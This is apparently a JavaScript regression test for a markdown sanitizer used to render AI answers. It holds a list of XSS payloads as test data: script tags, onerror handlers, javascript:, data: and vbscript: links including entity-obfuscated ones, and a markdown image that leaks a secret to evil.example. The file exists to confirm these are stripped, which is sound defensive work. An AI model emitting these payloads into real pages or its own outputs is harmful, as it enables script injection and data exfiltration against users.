/**
 * 回答 markdown 渲染的安全回归：把一组恶意载荷跑一遍 SafeMarkdown 用的同一条管线
 * （lib/markdownPolicy.mjs），检查输出里没有脚本、事件处理器、危险协议、外站图片。
 *
 * 升级 streamdown / @copilotkit/* 之后、每次部署前都跑：
 *   npm run check:xss
 * 失败即退出码 1。
 */
import { createRequire } from "node:module";
import { pathToFileURL } from "node:url";
import { toHtml } from "hast-util-to-html";
import {
  isTrustedUrl,
  parseSafeUrl,
  safeRehypePlugins,
  safeRemarkPlugins,
  safeRemarkRehypeOptions,
  trustedHosts,
} from "../lib/markdownPolicy.mjs";

// unified / remark-parse / remark-rehype 要用 streamdown 自己解析到的那一份：
// node_modules 里有多个版本，混用会让 gfm 扩展对不上
const fromStreamdown = createRequire(createRequire(import.meta.url).resolve("streamdown"));
const load = (name) => import(pathToFileURL(fromStreamdown.resolve(name)).href);
const { unified } = await load("unified");
const { default: remarkParse } = await load("remark-parse");
const { default: remarkRehype } = await load("remark-rehype");

const ORIGIN = "https://next.wikipali.org";
const hosts = trustedHosts("");

const pipeline = unified()
  .use(remarkParse)
  .use(safeRemarkPlugins)
  .use(remarkRehype, safeRemarkRehypeOptions)
  .use(safeRehypePlugins(hosts, ORIGIN));

/** [名字, 载荷, 输出里不许出现的东西（正则）] */
const CASES = [
  ["script tag", "<script>alert(1)</script>hi", /<script/i],
  ["img onerror", '<img src=x onerror="alert(1)">', /onerror|<img/i],
  ["svg script", "<svg><script>alert(1)</script></svg>", /<svg|<script/i],
  ["iframe", '<iframe src="https://evil.example"></iframe>', /<iframe/i],
  ["object", '<object data="https://evil.example/x.swf"></object>', /<object/i],
  ["form", '<form action="https://evil.example"><input name=pw></form>', /<form|<input[^>]*name="?pw/i],
  ["style overlay", '<div style="position:fixed;inset:0">x</div>', /position:\s*fixed/i],
  ["raw anchor js", '<a href="javascript:alert(1)">y</a>', /javascript:/i],
  ["md link js", "[x](javascript:alert(1))", /javascript:/i],
  ["md link js mixed case", "[x](JaVaScRiPt:alert(1))", /javascript:/i],
  ["md link js entity", "[x](&#106;avascript:alert(1))", /javascript:/i],
  ["md link data", "[x](data:text/html,<script>alert(1)</script>)", /data:text/i],
  ["md link vbscript", "[x](vbscript:msgbox(1))", /vbscript:/i],
  ["image exfil", "![a](https://evil.example/p.png?q=secret)", /evil\.example/i],
  ["image data", "![a](data:image/png;base64,iVBORw0KGgo=)", /data:image/i],
  ["image proto-relative", "![a](//evil.example/p.png)", /evil\.example/i],
  ["autolink js", "<javascript:alert(1)>", /href="javascript:/i],
  ["reference link js", "[x][1]\n\n[1]: javascript:alert(1)", /javascript:/i],
  ["katex href", "$$\\href{javascript:alert(1)}{x}$$", /href="javascript:/i],
  ["html in code stays text", "`<script>alert(1)</script>`", /<script>/],
  ["mermaid fence", "```mermaid\ngraph TD; A-->B\n```", /language-mermaid/],
  ["id clobbering", '<a id="__proto__">x</a><form id="test">', /id="__proto__"|<form/i],
];

/** 必须照常渲染的正常内容 */
const KEEP = [
  ["trusted image", "![t](https://next.wikipali.org/logo.png)", /<img[^>]+next\.wikipali\.org\/logo\.png/],
  ["citation link", "[dī.ni.1. 93-6](https://next.wikipali.org/library/tipitaka/93-5/read#6)", /href="https:\/\/next\.wikipali\.org\/library/],
  ["external link kept (labelled by SafeLink)", "[x](https://example.com/a)", /href="https:\/\/example\.com\/a"/],
  ["bold", "**巴利**", /<strong>巴利<\/strong>/],
];

let failed = 0;
for (const [name, md, forbidden] of CASES) {
  const html = toHtml(await pipeline.run(pipeline.parse(md)));
  if (forbidden.test(html)) {
    failed++;
    console.log(`FAIL  ${name}\n      in:  ${md}\n      out: ${html}`);
  } else {
    console.log(`ok    ${name}`);
  }
}
for (const [name, md, expected] of KEEP) {
  const html = toHtml(await pipeline.run(pipeline.parse(md)));
  if (!expected.test(html)) {
    failed++;
    console.log(`FAIL  ${name}（正常内容被误伤）\n      out: ${html}`);
  } else {
    console.log(`ok    ${name}`);
  }
}

// SafeLink / 引用卡片用的链接判定
const checks = [
  [parseSafeUrl("javascript:alert(1)", ORIGIN), null],
  [parseSafeUrl("/library/tipitaka/1-2/read", ORIGIN)?.hostname, "next.wikipali.org"],
  [isTrustedUrl(new URL("https://next.wikipali.org/x"), hosts), true],
  [isTrustedUrl(new URL("https://wikipali.org.evil.example/x"), hosts), false],
  [isTrustedUrl(new URL("https://evilwikipali.org/x"), hosts), false],
];
checks.forEach(([got, want], i) => {
  if (got !== want) {
    failed++;
    console.log(`FAIL  url check #${i}: got ${got}, want ${want}`);
  }
});

console.log(failed ? `\n${failed} 项失败` : "\n全部通过");
process.exit(failed ? 1 : 0);
